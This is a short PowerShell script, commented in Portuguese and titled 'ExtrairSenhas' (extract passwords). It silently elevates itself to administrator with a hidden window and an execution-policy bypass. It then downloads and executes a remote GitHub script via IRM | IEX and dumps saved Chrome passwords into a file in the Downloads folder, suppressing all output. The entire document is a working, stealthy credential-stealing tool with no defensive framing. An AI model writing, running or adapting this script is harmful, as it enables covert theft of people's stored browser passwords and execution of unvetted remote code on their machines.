# ExtrairSenhas.ps1 - Força a pasta Downloads como local de trabalho

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# Define a pasta Downloads
$pastaDownloads = [Environment]::GetFolderPath("UserDownloads")
if (-not (Test-Path $pastaDownloads)) {
    $pastaDownloads = Join-Path $env:USERPROFILE "Downloads"
}

# MUDA para a pasta Downloads (isso faz o Invoke-PowerChrome salvar lá automaticamente)
cd $pastaDownloads

$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDownloads "senhas_chrome_$datahora.txt"

# Carrega o script do GitHub
$null = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

# Executa - o script original vai salvar na pasta atual (Downloads)
Invoke-PowerChrome -Browser Chrome *> $null

# Sai silenciosamente
exit
